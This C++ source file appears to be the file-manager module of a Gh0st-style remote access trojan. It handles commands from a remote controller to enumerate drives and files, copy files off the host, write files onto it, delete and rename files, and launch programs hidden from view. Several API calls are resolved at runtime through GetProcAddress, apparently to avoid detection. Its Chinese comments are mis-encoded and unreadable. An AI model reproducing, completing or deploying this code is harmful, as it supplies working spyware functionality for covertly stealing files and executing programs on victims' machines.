// MyFileManager.cpp: implementation of the CMyFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "MyFileManager.h"
#include <tchar.h>
#include <winnt.h>
#include <string.h>
#include "..\\..\\debug.h"
#include "imagehlp.h"
#include <shellapi.h>

#pragma comment(lib,"imagehlp.lib")

typedef struct _FILESIZE
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE, *LPFILESIZE;

CMyFileManager::CMyFileManager(CClientSocket *pClient) :CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// �����������б�, ��ʼ�����ļ������������߳�
	SendDriveList();
}

CMyFileManager::~CMyFileManager()
{
	m_UploadList.clear();
}

void CMyFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// ��ȡ�ļ��б�
		SendFilesList((TCHAR *)(lpBuffer + 1));
		break;
	case COMMAND_DELETE_FILE:// ɾ���ļ�
		DeleteFile((TCHAR *)(lpBuffer + 1));
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// ɾ���ļ�
		DeleteDirectory((TCHAR *)(lpBuffer + 1));
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // �ϴ��ļ�
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // �ϴ��ļ�
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((TCHAR *)(lpBuffer + 1), SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((TCHAR *)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_PACK_RAR:
		Dbp("COMMAND_PACK_RAR reve");
		PackFile(lpBuffer);
		break;
	case COMMAND_UNPACK_RAR:
		Dbp("COMMAND_UNPACK_RAR reve");
		UnpackFile(lpBuffer);
		break;
	default:
		break;
	}
}

bool CMyFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	ShellExecute(GetDesktopWindow(), _T("open"), lpFile, NULL, NULL, nShowCmd);

	return 0;
}

UINT CMyFileManager::SendDriveList()
{
	char	DriveString[256];
	// ǰһ���ֽ�Ϊ���ƣ������52�ֽ�Ϊ���������������
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // �������б�

	typedef BOOL(WINAPI *GETLOGDS)(DWORD nBufferLength, LPSTR lpBuffer);
	HINSTANCE hdllde = GetModuleHandleW(L"KERNEL32.dll");
	GETLOGDS myGetLogds = (GETLOGDS)GetProcAddress(hdllde, "GetLogicalDriveStringsA");
	myGetLogds(sizeof(DriveString), DriveString);

	pDrive = DriveString;

	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	DWORD dwOffset;
	for (dwOffset = 1; *pDrive != '\0'; pDrive += strlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// �õ��ļ�ϵͳ��Ϣ����С
		GetVolumeInformationA(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFOA	sfi;

		typedef BOOL(WINAPI *SHGET)(LPCSTR pszPath, DWORD dwFileAttributes, SHFILEINFOA *psfi, UINT, UINT);
		HINSTANCE shell32 = LoadLibraryW(L"shell32.dll");
		SHGET mySHGetFileInfo = (SHGET)GetProcAddress(shell32, "SHGetFileInfoA");

		mySHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFOA), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		int	nTypeNameLen = strlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = strlen(FileSystem) + 1;

		// ������̴�С
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceExA(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// ��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveTypeA(pDrive);

		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));

		// ���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);

		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CMyFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// ���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;

	UINT	nRet = 0;
	TCHAR	strPath[MAX_PATH];
	TCHAR	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize = 1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;

	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);

	wsprintf(strPath, _T("%s\\*.*"), lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}

	*lpList = TOKEN_FILE_LIST;

	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (lstrcmp(pszFileName, _T(".")) == 0 || lstrcmp(pszFileName, _T("..")) == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = lstrlen(pszFileName)*sizeof(TCHAR);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		*(lpList + dwOffset + 1) = 0;
		dwOffset++;
		dwOffset++;
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while (FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);

	FindClose(hFile);

	return nRet;
}

bool CMyFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	TCHAR	lpszFilter[MAX_PATH];

	wsprintf(lpszFilter, _T("%s\\*.*"), lpszDirectory);

	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);

	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return FALSE;

	do
	{
		if (wfd.cFileName[0] != _T('.'))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				TCHAR strDirectory[MAX_PATH];
				wsprintf(strDirectory, _T("%s\\%s"), lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				TCHAR strFile[MAX_PATH];
				wsprintf(strFile, _T("%s\\%s"), lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind);

	if (!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

UINT CMyFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
	HANDLE	hFile;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	lstrcpy(m_strCurrentProcessFileName, lpszFileName);

	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE) return FALSE;

	dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	// �������ݰ��������ļ�����
	int		nPacketSize = (lstrlen(lpszFileName) + 1)*sizeof(TCHAR) + 9;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, (lstrlen(lpszFileName) + 1)*sizeof(TCHAR));

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CMyFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	TCHAR		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// Զ��������������һ��
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE) return -1;

	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// ������һ���ļ�
void CMyFileManager::UploadNext()
{
#ifdef UNICODE
	list <wstring>::iterator it = m_UploadList.begin();
#else
	list <string>::iterator it = m_UploadList.begin();
#endif
	// ɾ��һ������
	m_UploadList.erase(it);
	// �����ϴ�����
	if (m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// �ϴ���һ��
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CMyFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CMyFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	TCHAR *temp = (TCHAR*)lpBuffer;

	if (temp[lstrlen(temp) - 1] == _T('\\'))
	{
		FixedUploadList((TCHAR *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((TCHAR *)lpBuffer);
	}
#ifdef UNICODE
	list <wstring>::iterator it = m_UploadList.begin();
#else
	list <string>::iterator it = m_UploadList.begin();
#endif
	// ���͵�һ���ļ�
	SendFileSize((*it).c_str());

	return true;
}

bool CMyFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	TCHAR	lpszFilter[MAX_PATH];
	TCHAR	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != _T('\\'))
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");

	wsprintf(lpszFilter, _T("%s%s*.*"), lpPathName, lpszSlash);

	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);

	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return false;

	do
	{
		if (wfd.cFileName[0] != _T('.'))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				TCHAR strDirectory[MAX_PATH];
				wsprintf(strDirectory, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				TCHAR strFile[MAX_PATH];
				wsprintf(strFile, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind);

	return true;
}

void CMyFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();

	SendToken(TOKEN_TRANSFER_FINISH);
}

void CMyFileManager::CreateFolder(LPBYTE lpBuffer)
{
	char szPath[256];
	WideCharToMultiByte(CP_ACP, 0, (TCHAR *)lpBuffer, lstrlen((TCHAR *)lpBuffer), szPath, 256, NULL, NULL);
	MakeSureDirectoryPathExists(szPath);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CMyFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	lstrcpy(m_strCurrentProcessFileName, (TCHAR *)(lpBuffer + 8));

	// �����ļ�����
	//m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	DWORD m_nCurrentProcessFileLength = pFileSize->dwSizeLow; ///�����ļ���С���ܳ���4G��������

	// �������Ŀ¼
	char szPath[256];
	WideCharToMultiByte(CP_ACP, 0, (TCHAR *)m_strCurrentProcessFileName, lstrlen((TCHAR *)m_strCurrentProcessFileName), szPath, 256, NULL, NULL);
	MakeSureDirectoryPathExists(szPath);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);

	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}

	FindClose(hFind);
}

void CMyFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);

	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;

	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// ��ʾ��ʲô
		// ���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// ����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;
		}
		// ������һ��
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// ƫ����0
		memset(bToken + 1, 0, 8);
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}

	FindClose(hFind);

	HANDLE	hFile = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0);

	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}

	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}

void CMyFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// �������
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;

	pFileSize = (FILESIZE *)lpBuffer;

	// �õ��������ļ��е�ƫ��
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	dwBytesToWrite = nSize - 8;

	HANDLE	hFile = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0;
	// д���ļ�
	nRet = WriteFile(hFile, pData, dwBytesToWrite, &dwBytesWrite, NULL);

	CloseHandle(hFile);
	// Ϊ�˱Ƚϣ�����������

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CMyFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CMyFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (TCHAR *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;

	HINSTANCE kernel32 = GetModuleHandleW(L"Kernel32.dll");

	typedef BOOL(WINAPI *MOVEF)(LPCTSTR, LPCTSTR);
#ifdef _UNICODE
	MOVEF  myMoveFile = (MOVEF)GetProcAddress(kernel32, "MoveFileW");
#else
	MOVEF  myMoveFile= (MOVEF)GetProcAddress(kernel32,"MoveFileA");
#endif

	myMoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

void CMyFileManager::PackFile(LPBYTE lpBuffer)
{
}

void CMyFileManager::UnpackFile(LPBYTE lpBuffer)
{
}